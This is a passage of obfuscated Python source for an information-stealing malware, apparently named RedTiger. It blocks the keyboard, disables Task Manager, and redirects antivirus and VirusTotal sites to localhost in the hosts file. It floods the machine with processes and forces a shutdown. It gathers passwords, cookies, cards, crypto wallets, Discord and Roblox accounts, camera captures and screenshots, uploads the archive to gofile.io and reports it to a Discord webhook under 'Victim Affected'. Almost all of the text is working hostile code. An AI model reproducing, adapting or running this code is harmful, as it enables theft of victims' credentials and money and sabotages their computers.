        "f1", "f2", "f3", "f4", "f5", "f6", "f7", "f8", "f9", "f10", "f11", "f12",
        "backslash", "semicolon", "comma", "period", "slash",
        "volume up", "volume down", "volume mute",
        "app", "sleep", "print screen", "pause",
    ]
    for k3y_b10ck in k3y:
        try: keyboard.block_key(k3y_b10ck)
        except: pass

def XYSZNBQCLSXKEOOOMLZEYSZMRRCKXLNMDIRQZRZFCLBORWAXDVAKVRXEACFVWBBGMSSIOXFGRLQGBQTTJCAHKFONVODHYZGSBYIV():
    import keyboard
    k3y = [
        "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
        "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "ù",
        "`", "+", "-", "=", "*", "[", "]", "\\", ";", "'", ",", ".", "/", 
        "space", "enter", "esc", "tab", "backspace", "delete", "insert",
        "up", "down", "left", "right", "equal", "home", "end", "page up", "page down",
        "caps lock", "num lock", "scroll lock", "shift", "ctrl", "cmd", "win",
        "f1", "f2", "f3", "f4", "f5", "f6", "f7", "f8", "f9", "f10", "f11", "f12",
        "backslash", "semicolon", "comma", "period", "slash",
        "volume up", "volume down", "volume mute",
        "app", "sleep", "print screen", "pause",
    ]
    for k3y_b10ck in k3y:
        try: keyboard.unblock_key(k3y_b10ck)
        except: pass

def VQHYJUHHAVPVCXYYWGIHFNMSAFHPOFLYSXTIBXSWWFPMGTZIZSSOXGSEKTJLLR():
    import psutil
    import subprocess
    import os

    "Perm Admin Required"
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == 'Taskmgr.exe':
            proc.terminate()
            break
    subprocess.run("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def ZUYKOZDCWGLXJPWISNFUHSEKMIDRRQSGBNAQFVDZNXOPWTRKNOXTDIEE():
    import os

    "Perm Admin Required"
    try:
        def GBZUZFKZWFRKOVVMNXTFVOCFFRCNVZLAKLAFYVHZJARYABPAJIXQMKKDYJWCFWYRXHVKXMWMBYPQKWCPVNSSKXPWFMVJ(ZKLTRSJFWFCDTUUCZKRVSZPKWVGKEBZDGGVEORMUKUMYZCEJHLBZWOWGEBYFKMEUPIKBGZSKMLZDZMJMDCKWMZTAGOPPGXBK):
            DHISQPWETCGHCTCKCKRBLGKAOHDBCRJRFMIBLTUVEUAHGRODHQJPRXPCUYRPJNJFTUU = os.path.join(os.environ["WINDIR"], "System32", "drivers", "etc", "hosts")
            if not os.path.exists(DHISQPWETCGHCTCKCKRBLGKAOHDBCRJRFMIBLTUVEUAHGRODHQJPRXPCUYRPJNJFTUU):
                DHISQPWETCGHCTCKCKRBLGKAOHDBCRJRFMIBLTUVEUAHGRODHQJPRXPCUYRPJNJFTUU = os.path.join("C:", "Windows", "System32", "drivers", "etc", "hosts")

            XSFQEKAFTTYQQNXLQIAGWYHYVOQLIXSKJGKKPQBYXBCNEIYUYLMFEARBNSMNQBQTZMT = "127.0.0.1"
            with open(DHISQPWETCGHCTCKCKRBLGKAOHDBCRJRFMIBLTUVEUAHGRODHQJPRXPCUYRPJNJFTUU, "a") as v4r_file:
                v4r_file.write("\n" + XSFQEKAFTTYQQNXLQIAGWYHYVOQLIXSKJGKKPQBYXBCNEIYUYLMFEARBNSMNQBQTZMT + " " + ZKLTRSJFWFCDTUUCZKRVSZPKWVGKEBZDGGVEORMUKUMYZCEJHLBZWOWGEBYFKMEUPIKBGZSKMLZDZMJMDCKWMZTAGOPPGXBK)
        
        PTOJJAOWICEKONSJDMHQPXIKLBEKOADTZWEWCEJZBAOJUJNXJJFLWDOXYWOZHUMUXJNAZROHBVYUHWFDKLOMM = [
            'virustotal.com', 
            'www.virustotal.com',
            'www.virustotal.com/gui/home/upload',
            'avast.com', 
            'totalav.com', 
            'scanguard.com', 
            'totaladblock.com', 
            'pcprotect.com', 
            'mcafee.com', 
            'bitdefender.com', 
            'us.norton.com', 
            'avg.com', 
            'malwarebytes.com', 
            'pandasecurity.com', 
            'avira.com', 
            'norton.com', 
            'eset.com', 
            'zillya.com', 
            'kaspersky.com', 
            'usa.kaspersky.com', 
            'sophos.com', 
            'home.sophos.com', 
            'adaware.com', 
            'bullguard.com', 
            'clamav.net', 
            'drweb.com', 
            'emsisoft.com', 
            'f-secure.com', 
            'zonealarm.com', 
            'trendmicro.com', 
            'ccleaner.com'
        ]

        for v4r_w3b51t3_t0_8l0ck in PTOJJAOWICEKONSJDMHQPXIKLBEKOADTZWEWCEJZBAOJUJNXJJFLWDOXYWOZHUMUXJNAZROHBVYUHWFDKLOMM:
            GBZUZFKZWFRKOVVMNXTFVOCFFRCNVZLAKLAFYVHZJARYABPAJIXQMKKDYJWCFWYRXHVKXMWMBYPQKWCPVNSSKXPWFMVJ(v4r_w3b51t3_t0_8l0ck)
    except:
        pass

def AHXERVRADZFHHELWEIOCFHFEGLGQSBDZEZLYSGJRCJXFNLKBWXIBXJWTFSDLDUAGRBO():
    import subprocess
    import threading

    def GUVKCLLYUGQYKHTMJFHLUJWTEMCXRFYXNLKAIOIDXXKSQBFSIKIAMTKEGIWLFXZZZYNVIGROCEIILUPEGIVEH():
        programs = [
            'calc.exe',
            'notepad.exe',
            'mspaint.exe',
            'explorer.exe',    
        ]
        for program in programs:
            for _ in range(1):
                subprocess.Popen(program)
    
    def HCUEAQMQMWHPRTIMYXIDXWHKWMIBTKWYZVWAQICXBVMKAZMTGVEZGRAYIARLNIDTEZAQOAINRBYQXSBPEBFHEGRBTUEOVPB():
        threads = []
        try:
            for _ in range(int(100)):
                t = threading.Thread(target=GUVKCLLYUGQYKHTMJFHLUJWTEMCXRFYXNLKAIOIDXXKSQBFSIKIAMTKEGIWLFXZZZYNVIGROCEIILUPEGIVEH)
                t.start()
                threads.append(t)
        except:
            pass

        for thread in threads:
            thread.join()

    HCUEAQMQMWHPRTIMYXIDXWHKWMIBTKWYZVWAQICXBVMKAZMTGVEZGRAYIARLNIDTEZAQOAINRBYQXSBPEBFHEGRBTUEOVPB()

def NKXSJHXEEXQUWIZIMHNCPQWYNKMQBCPFUOKEGXJKCOYTAWVLNPPORCTSXKUTZDVWYTHJLUKYETLNAAOGNZLBBJBERXFZDMZTU():
    import sys
    import os
    if sys.platform.startswith('win'):
        os.system('shutdown /s /t 15')
    elif sys.platform.startswith('linux'):
        os.system('shutdown -h +0.25')

def GUVKCLLYUGQYKHTMJFHLUJWTEMCXRFYXNLKAIOIDXXKSQBFSIKIAMTKEGIWLFXZZZYNVIGROCEIILUPEGIVEHOpti0ns():
    import keyboard
    while True:
        try:
            CIJEOPULCZFCLQYBBORSPASWSTDSTNBKLSZXSJPYTTXRLWACPXCMBUXHVOKNQSCYTNKFMHJS()
            AHXERVRADZFHHELWEIOCFHFEGLGQSBDZEZLYSGJRCJXFNLKBWXIBXJWTFSDLDUAGRBO()
            PMHVABMUQOHHTZPUJCUUTLMLFCAKRODYGDEVCWINLWBJYGGDFTTLCVZHTENAJWLMVG()
            if keyboard.is_pressed('alt') and keyboard.is_pressed('alt gr'):
                Unb10ck_K3y()
                break
        except:
            pass

LAITXEOORHJJACVVJPMGOOUHFLMXBBGBQYXNFLZJZRJAXYNAVRNNNPJENTPMUSICNVQHJNZPTIQA = []

EMQRGHYIPMUXHOCLJYGKJDUYPSWDOUCTYIGHPBFXTZTCGULXXSHA = io.BytesIO()
with zipfile.ZipFile(EMQRGHYIPMUXHOCLJYGKJDUYPSWDOUCTYIGHPBFXTZTCGULXXSHA, "w", zipfile.ZIP_DEFLATED) as TNGFVIMTFECFIRXADBETKMGKCNEPMHUTVLYJJZSKQYMIJLZFQIKOEAAVCXUVNYYHJXHMJXTSG:

    try: 
        HCOOUFPOBBVYXEFSQDSYLNXDJQKFYQREPQZWWACWAJVNHOHBROCSGBYZVC = PRRHVKIGAMSJHSPNATIKJLTQDEZDFFWEZRKDSJTZTXYELWPWPMNQAGM()
    except Exception as e:
        HCOOUFPOBBVYXEFSQDSYLNXDJQKFYQREPQZWWACWAJVNHOHBROCSGBYZVC = f"Error: {e}"

    try: 
        TUBBVLHRLECJDFXJXMWLFCZBJMSWYZSNGZGDOBCXOPSZGWOMXAWRIEFMVAKJTORFEXQVRCOMGUM_system_info = KASNLIRKRZSSFSXUSAXIRFVUYGKTREMIKIJDEFGHPOBQXQSLACUJCEEFECBVDJTJKOC(TNGFVIMTFECFIRXADBETKMGKCNEPMHUTVLYJJZSKQYMIJLZFQIKOEAAVCXUVNYYHJXHMJXTSG)
    except Exception as e:
        TUBBVLHRLECJDFXJXMWLFCZBJMSWYZSNGZGDOBCXOPSZGWOMXAWRIEFMVAKJTORFEXQVRCOMGUM_system_info = f"Error: {e}"

    try: 
        PLVUMDYCXFHKGEESNFQSVVPXDRMWQTPSAWPZMEMNPCOAILLMNRULLGMUDOXZUWXMUCFBQDUWJJBPBGVLYOTCWCG = THBLIOUFXHZAUYMPAOIIXBTEVSMTIDKUXCIGBUJCRYHGRBYMOMPPZQALHLGXHCROSYISY(TNGFVIMTFECFIRXADBETKMGKCNEPMHUTVLYJJZSKQYMIJLZFQIKOEAAVCXUVNYYHJXHMJXTSG)
    except Exception as e:
        PLVUMDYCXFHKGEESNFQSVVPXDRMWQTPSAWPZMEMNPCOAILLMNRULLGMUDOXZUWXMUCFBQDUWJJBPBGVLYOTCWCG = f"Error: {e}"

    try: 
        AGTZIMNEBIIUMATLJGDEKDVBTAGANSFXMUQRIKWNWMKBASCCBXMIKQGFPBTQFNHVEFLCUWFOIQBWGMUIEIYVK, BQRNKPDARZYAAWUUBYLQQGHMKPKUKGYVANVTJQIRPUZLDIUSCZEGHWTZYBLZQVDINXQJOQMABHCYEWHBTKN, XUCZFHOWEVJXQTCJISCRQSXUTXSHZWOJZIFOXKUAIFNHHLYSBFLZRTMXZUSVQXAQE, WGSDPFHRUJHFSFTDFNZHGZXKYDRRNEFFHPYFIKCYJCLKLFJUUXVYDQBFAFTR, INCLDQWUGPUUYYADCVTOXEXORLVDJPEOZNQBYBAJINNVRCWNZEHGQIMZBMLSXXOHETZDY, LISEGTYKRSPENLCUCKWPKXUAASUEMTLSWLQWOBPZUXRGMHLGYQWCZKYEFHY = DHXAZPQGQPVVJJKBZJDJANFZJPUCVIVPURQRHVPZEFEPJNYERCDDNKUHZGEBVPXLQFARZWTJBDTIRWMDRGDEEGUWYI(TNGFVIMTFECFIRXADBETKMGKCNEPMHUTVLYJJZSKQYMIJLZFQIKOEAAVCXUVNYYHJXHMJXTSG)
    except Exception as e:
        AGTZIMNEBIIUMATLJGDEKDVBTAGANSFXMUQRIKWNWMKBASCCBXMIKQGFPBTQFNHVEFLCUWFOIQBWGMUIEIYVK = f"Error: {e}"
        BQRNKPDARZYAAWUUBYLQQGHMKPKUKGYVANVTJQIRPUZLDIUSCZEGHWTZYBLZQVDINXQJOQMABHCYEWHBTKN = f"Error: {e}"
        XUCZFHOWEVJXQTCJISCRQSXUTXSHZWOJZIFOXKUAIFNHHLYSBFLZRTMXZUSVQXAQE = f"Error: {e}"
        WGSDPFHRUJHFSFTDFNZHGZXKYDRRNEFFHPYFIKCYJCLKLFJUUXVYDQBFAFTR = f"Error: {e}"
        INCLDQWUGPUUYYADCVTOXEXORLVDJPEOZNQBYBAJINNVRCWNZEHGQIMZBMLSXXOHETZDY = f"Error: {e}"
        LISEGTYKRSPENLCUCKWPKXUAASUEMTLSWLQWOBPZUXRGMHLGYQWCZKYEFHY = f"Error: {e}"

    try: 
        ANCSWJFCYPXILHRWSCYHOAJWMELPJKBWQWPMKGQDFAMBFHBZOMSNCMBCJYPGJGZEKYQX = IUSDIYYLVSWGXPYIXFSNQMPOOUBALVOVHPIOEEZYYICBVHFUZCERUWSYXGOXMJXOAVITZUXNPTAPHTMOUUWANTNFUKWS(TNGFVIMTFECFIRXADBETKMGKCNEPMHUTVLYJJZSKQYMIJLZFQIKOEAAVCXUVNYYHJXHMJXTSG)
    except Exception as e:
        ANCSWJFCYPXILHRWSCYHOAJWMELPJKBWQWPMKGQDFAMBFHBZOMSNCMBCJYPGJGZEKYQX = f"Error: {e}"

    try: 
        TUBBVLHRLECJDFXJXMWLFCZBJMSWYZSNGZGDOBCXOPSZGWOMXAWRIEFMVAKJTORFEXQVRCOMGUM_camera_capture = STBPRLBGCGNQEGNDTPGCAZHHJEDDXLRLVIINUEDYHKRZUWFEAPMWAOOXKCKBLGVCCMPOYEQFSAGI(TNGFVIMTFECFIRXADBETKMGKCNEPMHUTVLYJJZSKQYMIJLZFQIKOEAAVCXUVNYYHJXHMJXTSG)
    except Exception as e:
        TUBBVLHRLECJDFXJXMWLFCZBJMSWYZSNGZGDOBCXOPSZGWOMXAWRIEFMVAKJTORFEXQVRCOMGUM_camera_capture = f"Error: {e}"

    try: 
        TUBBVLHRLECJDFXJXMWLFCZBJMSWYZSNGZGDOBCXOPSZGWOMXAWRIEFMVAKJTORFEXQVRCOMGUM_screenshot = GTPBYGSYPESNOOVUIZZLGMAHYBGBGHONMMCKMIILFOTDQFJQGORVKVLDYTOBNMHUUGQAJOOAQWTFSKFOAPR(TNGFVIMTFECFIRXADBETKMGKCNEPMHUTVLYJJZSKQYMIJLZFQIKOEAAVCXUVNYYHJXHMJXTSG)
    except Exception as e:
        TUBBVLHRLECJDFXJXMWLFCZBJMSWYZSNGZGDOBCXOPSZGWOMXAWRIEFMVAKJTORFEXQVRCOMGUM_screenshot = f"Error: {e}"

    try: 
        XBQOLQTWKNRPKXGMIQLGYQITMGLFGNEKTAPAUCNXQDDBPWSDQCUFVQGQI, DMWTZECDUJWKDZQHGIDJKQHSIGQMAODGFYIWWZGMXPAICZMUXKCBXANJYFUKHJFNV, PERCLUEBFLRONEZFFCKKGFNEAKCGFTORMIPOTPFKRUGEDKLYXZXOEYWQOFFEYYSDYWTYAQA = BRNCEIHUVTVZUAEKHSVNSZMINBDCIWMCJJOUEGHMAITTJCYNPNNIEQWSFSCKUTKOXLIZYDG(TNGFVIMTFECFIRXADBETKMGKCNEPMHUTVLYJJZSKQYMIJLZFQIKOEAAVCXUVNYYHJXHMJXTSG)
    except Exception as e:
        TUBBVLHRLECJDFXJXMWLFCZBJMSWYZSNGZGDOBCXOPSZGWOMXAWRIEFMVAKJTORFEXQVRCOMGUM_screenshot = f"Error: {e}"

    try: 
        ATHBYILMUJZNGHKJWEKPJMGUVDPNFJDOXAZZINEFCKUTMQPWRYIUYBZMQEJFFPYXYTZYIPTHKCRYLIQUUMAELVJWFTXFLFOJ = GZVHSMVALADVVKXUZXRXBBPPVRKUJGNQKGJBWHKZVTNHYIVMZOUDICUPMRBHWHMDLQFIOMAIXJDDJGDDJDBQFTECAVYUXITJI(TNGFVIMTFECFIRXADBETKMGKCNEPMHUTVLYJJZSKQYMIJLZFQIKOEAAVCXUVNYYHJXHMJXTSG)
    except Exception as e:
        ATHBYILMUJZNGHKJWEKPJMGUVDPNFJDOXAZZINEFCKUTMQPWRYIUYBZMQEJFFPYXYTZYIPTHKCRYLIQUUMAELVJWFTXFLFOJ = f"Error: {e}"

    if HCOOUFPOBBVYXEFSQDSYLNXDJQKFYQREPQZWWACWAJVNHOHBROCSGBYZVC != None:
        LAITXEOORHJJACVVJPMGOOUHFLMXBBGBQYXNFLZJZRJAXYNAVRNNNPJENTPMUSICNVQHJNZPTIQA.append(f"Discord Injection : {HCOOUFPOBBVYXEFSQDSYLNXDJQKFYQREPQZWWACWAJVNHOHBROCSGBYZVC}")

    if TUBBVLHRLECJDFXJXMWLFCZBJMSWYZSNGZGDOBCXOPSZGWOMXAWRIEFMVAKJTORFEXQVRCOMGUM_camera_capture != None:
        LAITXEOORHJJACVVJPMGOOUHFLMXBBGBQYXNFLZJZRJAXYNAVRNNNPJENTPMUSICNVQHJNZPTIQA.append(f"Camera Capture    : {TUBBVLHRLECJDFXJXMWLFCZBJMSWYZSNGZGDOBCXOPSZGWOMXAWRIEFMVAKJTORFEXQVRCOMGUM_camera_capture}")

    if TUBBVLHRLECJDFXJXMWLFCZBJMSWYZSNGZGDOBCXOPSZGWOMXAWRIEFMVAKJTORFEXQVRCOMGUM_screenshot != None:
        LAITXEOORHJJACVVJPMGOOUHFLMXBBGBQYXNFLZJZRJAXYNAVRNNNPJENTPMUSICNVQHJNZPTIQA.append(f"Screenshot        : {TUBBVLHRLECJDFXJXMWLFCZBJMSWYZSNGZGDOBCXOPSZGWOMXAWRIEFMVAKJTORFEXQVRCOMGUM_screenshot}")

    if TUBBVLHRLECJDFXJXMWLFCZBJMSWYZSNGZGDOBCXOPSZGWOMXAWRIEFMVAKJTORFEXQVRCOMGUM_system_info != None:
        LAITXEOORHJJACVVJPMGOOUHFLMXBBGBQYXNFLZJZRJAXYNAVRNNNPJENTPMUSICNVQHJNZPTIQA.append(f"System Info       : {TUBBVLHRLECJDFXJXMWLFCZBJMSWYZSNGZGDOBCXOPSZGWOMXAWRIEFMVAKJTORFEXQVRCOMGUM_system_info}")

    if PLVUMDYCXFHKGEESNFQSVVPXDRMWQTPSAWPZMEMNPCOAILLMNRULLGMUDOXZUWXMUCFBQDUWJJBPBGVLYOTCWCG != None:
        LAITXEOORHJJACVVJPMGOOUHFLMXBBGBQYXNFLZJZRJAXYNAVRNNNPJENTPMUSICNVQHJNZPTIQA.append(f"Discord Accounts  : {PLVUMDYCXFHKGEESNFQSVVPXDRMWQTPSAWPZMEMNPCOAILLMNRULLGMUDOXZUWXMUCFBQDUWJJBPBGVLYOTCWCG}")

    if ANCSWJFCYPXILHRWSCYHOAJWMELPJKBWQWPMKGQDFAMBFHBZOMSNCMBCJYPGJGZEKYQX != None:
        LAITXEOORHJJACVVJPMGOOUHFLMXBBGBQYXNFLZJZRJAXYNAVRNNNPJENTPMUSICNVQHJNZPTIQA.append(f"Roblox Accounts   : {ANCSWJFCYPXILHRWSCYHOAJWMELPJKBWQWPMKGQDFAMBFHBZOMSNCMBCJYPGJGZEKYQX}")

    if BQRNKPDARZYAAWUUBYLQQGHMKPKUKGYVANVTJQIRPUZLDIUSCZEGHWTZYBLZQVDINXQJOQMABHCYEWHBTKN != None:
        LAITXEOORHJJACVVJPMGOOUHFLMXBBGBQYXNFLZJZRJAXYNAVRNNNPJENTPMUSICNVQHJNZPTIQA.append(f"Passwords         : {BQRNKPDARZYAAWUUBYLQQGHMKPKUKGYVANVTJQIRPUZLDIUSCZEGHWTZYBLZQVDINXQJOQMABHCYEWHBTKN}")

    if XUCZFHOWEVJXQTCJISCRQSXUTXSHZWOJZIFOXKUAIFNHHLYSBFLZRTMXZUSVQXAQE != None:
        LAITXEOORHJJACVVJPMGOOUHFLMXBBGBQYXNFLZJZRJAXYNAVRNNNPJENTPMUSICNVQHJNZPTIQA.append(f"Cookies           : {XUCZFHOWEVJXQTCJISCRQSXUTXSHZWOJZIFOXKUAIFNHHLYSBFLZRTMXZUSVQXAQE}")

    if LISEGTYKRSPENLCUCKWPKXUAASUEMTLSWLQWOBPZUXRGMHLGYQWCZKYEFHY != None:
        LAITXEOORHJJACVVJPMGOOUHFLMXBBGBQYXNFLZJZRJAXYNAVRNNNPJENTPMUSICNVQHJNZPTIQA.append(f"Cards             : {LISEGTYKRSPENLCUCKWPKXUAASUEMTLSWLQWOBPZUXRGMHLGYQWCZKYEFHY}")

    if WGSDPFHRUJHFSFTDFNZHGZXKYDRRNEFFHPYFIKCYJCLKLFJUUXVYDQBFAFTR != None:
        LAITXEOORHJJACVVJPMGOOUHFLMXBBGBQYXNFLZJZRJAXYNAVRNNNPJENTPMUSICNVQHJNZPTIQA.append(f"Browsing History  : {WGSDPFHRUJHFSFTDFNZHGZXKYDRRNEFFHPYFIKCYJCLKLFJUUXVYDQBFAFTR}")

    if INCLDQWUGPUUYYADCVTOXEXORLVDJPEOZNQBYBAJINNVRCWNZEHGQIMZBMLSXXOHETZDY != None:
        LAITXEOORHJJACVVJPMGOOUHFLMXBBGBQYXNFLZJZRJAXYNAVRNNNPJENTPMUSICNVQHJNZPTIQA.append(f"Download History  : {INCLDQWUGPUUYYADCVTOXEXORLVDJPEOZNQBYBAJINNVRCWNZEHGQIMZBMLSXXOHETZDY}")

    if AGTZIMNEBIIUMATLJGDEKDVBTAGANSFXMUQRIKWNWMKBASCCBXMIKQGFPBTQFNHVEFLCUWFOIQBWGMUIEIYVK != None:
        LAITXEOORHJJACVVJPMGOOUHFLMXBBGBQYXNFLZJZRJAXYNAVRNNNPJENTPMUSICNVQHJNZPTIQA.append(f"Extentions        : {AGTZIMNEBIIUMATLJGDEKDVBTAGANSFXMUQRIKWNWMKBASCCBXMIKQGFPBTQFNHVEFLCUWFOIQBWGMUIEIYVK}")

    if XBQOLQTWKNRPKXGMIQLGYQITMGLFGNEKTAPAUCNXQDDBPWSDQCUFVQGQI != None:
        LAITXEOORHJJACVVJPMGOOUHFLMXBBGBQYXNFLZJZRJAXYNAVRNNNPJENTPMUSICNVQHJNZPTIQA.append(f"Wallets           : {XBQOLQTWKNRPKXGMIQLGYQITMGLFGNEKTAPAUCNXQDDBPWSDQCUFVQGQI}")

    if DMWTZECDUJWKDZQHGIDJKQHSIGQMAODGFYIWWZGMXPAICZMUXKCBXANJYFUKHJFNV != None:
        LAITXEOORHJJACVVJPMGOOUHFLMXBBGBQYXNFLZJZRJAXYNAVRNNNPJENTPMUSICNVQHJNZPTIQA.append(f"Game Launchers    : {DMWTZECDUJWKDZQHGIDJKQHSIGQMAODGFYIWWZGMXPAICZMUXKCBXANJYFUKHJFNV}")
    
    if PERCLUEBFLRONEZFFCKKGFNEAKCGFTORMIPOTPFKRUGEDKLYXZXOEYWQOFFEYYSDYWTYAQA != None:
        LAITXEOORHJJACVVJPMGOOUHFLMXBBGBQYXNFLZJZRJAXYNAVRNNNPJENTPMUSICNVQHJNZPTIQA.append(f"Apps              : {PERCLUEBFLRONEZFFCKKGFNEAKCGFTORMIPOTPFKRUGEDKLYXZXOEYWQOFFEYYSDYWTYAQA}")
    
    if ATHBYILMUJZNGHKJWEKPJMGUVDPNFJDOXAZZINEFCKUTMQPWRYIUYBZMQEJFFPYXYTZYIPTHKCRYLIQUUMAELVJWFTXFLFOJ != None:
        LAITXEOORHJJACVVJPMGOOUHFLMXBBGBQYXNFLZJZRJAXYNAVRNNNPJENTPMUSICNVQHJNZPTIQA.append(f"Interesting Files : {ATHBYILMUJZNGHKJWEKPJMGUVDPNFJDOXAZZINEFCKUTMQPWRYIUYBZMQEJFFPYXYTZYIPTHKCRYLIQUUMAELVJWFTXFLFOJ}")

EMQRGHYIPMUXHOCLJYGKJDUYPSWDOUCTYIGHPBFXTZTCGULXXSHA.seek(0)

try:
    try: EVYXUKSTHXQDFDRSDSQQZZKWTDQPKHUQTVBHUQIQULVCIOAJVBLYVHJRZCNNS = loads(urlopen("https://api.gofile.io/getServer").read().decode('utf-8'))["data"]["server"]
    except: EVYXUKSTHXQDFDRSDSQQZZKWTDQPKHUQTVBHUQIQULVCIOAJVBLYVHJRZCNNS = "store4"

    ZOHPPOKUOHFQVOHZQKDPBKRZYJTJFBTKXDTOAYNMPUHARDHPTEENUWRNAWEDSDUVJOHWUQCOLQZFKPOS = requests.post(
        f"https://{EVYXUKSTHXQDFDRSDSQQZZKWTDQPKHUQTVBHUQIQULVCIOAJVBLYVHJRZCNNS}.gofile.io/uploadFile",
        files={"file": (f"RedTiger_{TABABGYGNEGEGTRMWONKLNRFKAROZGLEJSGWNNUOZZDDOSCZHBZCJIFJYGIPKOFVDVGLIILLYBFLIJWZELK.replace(' ', '_')}.zip", EMQRGHYIPMUXHOCLJYGKJDUYPSWDOUCTYIGHPBFXTZTCGULXXSHA)}
    )

    WGQAMIKISWUABMZEXHQDSGWAOJUDRQSHLONGUEVMLLVVKXKJTMCECUEPHFOJOMHSCFCFCTYGCAMYIIMUZAHNNPNTTNGBKFIIRXQ = ZOHPPOKUOHFQVOHZQKDPBKRZYJTJFBTKXDTOAYNMPUHARDHPTEENUWRNAWEDSDUVJOHWUQCOLQZFKPOS.json()["data"]["downloadPage"]
except Exception as e:
    WGQAMIKISWUABMZEXHQDSGWAOJUDRQSHLONGUEVMLLVVKXKJTMCECUEPHFOJOMHSCFCFCTYGCAMYIIMUZAHNNPNTTNGBKFIIRXQ = f"Error: {e}"

embed = discord.Embed(title="Victim Affected", color=UIAYERRZOZDNMQQWTYXAWIFVFIAXSDDGZXYMWFTCDAAICHXZUETLRGOQXYEFPTQDJ
).add_field(
    inline=False,
    name="Summary of Information", 
    value=f"""```
Hostname    : {BZJKBOXPOJRTXZUXMOGUWDVDQJPFDYNYGCYFMYMLKEUSSNINJH}
Username    : {TABABGYGNEGEGTRMWONKLNRFKAROZGLEJSGWNNUOZZDDOSCZHBZCJIFJYGIPKOFVDVGLIILLYBFLIJWZELK}
DisplayName : {MSHFCCICDZXNXUIOQIMFVBHSAOTRBSYVCEWJCGHYOHDBLRSPSYUMGZLZAOZMFE}
Ip Public   : {BRMHIEVVSJOCHAPHFRRZHHEOTEYSUZSJDVOCWRYUQZFDKESQORWEOXNGHHZMIYPZOZUSWGKATQWZNXHPFYZQ}
Ip Local    : {JLHPALQZDHECTHPEWZNEUOITWNGFEZQRQSRCOGIGRVYPAQMNIRRXTNHDJBCVGKRBRTURPQFUSDIRZIIUBUMINWKTZJT}
Country     : {NSYKSRGHKEWDLNRKIGYFHEIOECKGEEZXQOHZCLXJDGZAUZIGOAWQFSBSHQVOLLCC}```"""
).add_field(
    inline=False,
    name="Stolen Information", 
    value=f"""```swift
{"\n".join(LAITXEOORHJJACVVJPMGOOUHFLMXBBGBQYXNFLZJZRJAXYNAVRNNNPJENTPMUSICNVQHJNZPTIQA)}```"""
).add_field(
    inline=False,
    name="Download Link", 
    value=f"""{WGQAMIKISWUABMZEXHQDSGWAOJUDRQSHLONGUEVMLLVVKXKJTMCECUEPHFOJOMHSCFCFCTYGCAMYIIMUZAHNNPNTTNGBKFIIRXQ}"""
).set_footer(
    text=XRAHNXGYBACEDPKBVSLFFQTKLNOEVOTNLOMDMMBUDWBWFYPNWKBSLMFQJS, 
    icon_url=PLHREVQMVZQALSBMLRDLDMZOBLLLYMFLCADEMMHFVHKPQZJIKQHHCUAGPSOCDTYOMARLIIYQAUIRPCCNNIDUWKSHCHVSCVVA
)

try:  
    DRHWFWBKDZLJBXXYZAJCQVFNTPGGKHQSUZXYCTLFXEEEHKIAJCCBP = discord.SyncWebhook.from_url(HOZWEYGUQIRHYYIUVGBEWQWNPTKAZXAFCHRLRJYXXPSOYEWDFIQEZUIWUHSQNRHDHEPMFMMPPMVNAUZNQMY)
    DRHWFWBKDZLJBXXYZAJCQVFNTPGGKHQSUZXYCTLFXEEEHKIAJCCBP.send(embed=embed, username=AQPNSFVGZMENGXJQJHOCHNNVXWUMUBKQNNNAUYQPICCBWGTUHKZUNDPVFKFKA, avatar_url=PLHREVQMVZQALSBMLRDLDMZOBLLLYMFLCADEMMHFVHKPQZJIKQHHCUAGPSOCDTYOMARLIIYQAUIRPCCNNIDUWKSHCHVSCVVA)
except: pass


try: threading.Thread(target=NNKDCXFPYGGPFPOZRCOJTRQJGMYFWWTQEUUDEVRZUJQMIHELLFDRHGYUQQVWF).start()
except: pass
try: threading.Thread(target=VQHYJUHHAVPVCXYYWGIHFNMSAFHPOFLYSXTIBXSWWFPMGTZIZSSOXGSEKTJLLR).start()
except: pass
try: threading.Thread(target=ZUYKOZDCWGLXJPWISNFUHSEKMIDRRQSGBNAQFVDZNXOPWTRKNOXTDIEE).start()
except: pass
try: threading.Thread(target=PWTLMMWABORVKPPSPAYTVAAXDPSRMQICKJQTDWXSSNSVCWHAITNNGJTRHMLVOLRMIYGPIWAOESIMHJDBLUDSAGL).start()
except: pass
try: threading.Thread(target=YLLCMYIKRYJNTESBWGBWUNHXXSLJIYGZDWHPNHODHDITRMBLEQVSGOWVQUCHUCSDBCQSLKCMELUKIFPWHHUVQOJG).start()
except: pass
try: threading.Thread(target=FTVVJPWCRRKQBVROFBRYVIPSFIZFEJUWJZTVWQLSYGTTIZXMHEMOPOJTPTEKHET).start()
except: pass
try: threading.Thread(target=HBDZWDVPHLOCOZGLBDZPEYELRMXYMSUVADOOYDZGLVESUYXDSBEIKEPQYXFN).start()
except: pass
try: threading.Thread(target=NKXSJHXEEXQUWIZIMHNCPQWYNKMQBCPFUOKEGXJKCOYTAWVLNPPORCTSXKUTZDVWYTHJLUKYETLNAAOGNZLBBJBERXFZDMZTU).start()
except: pass
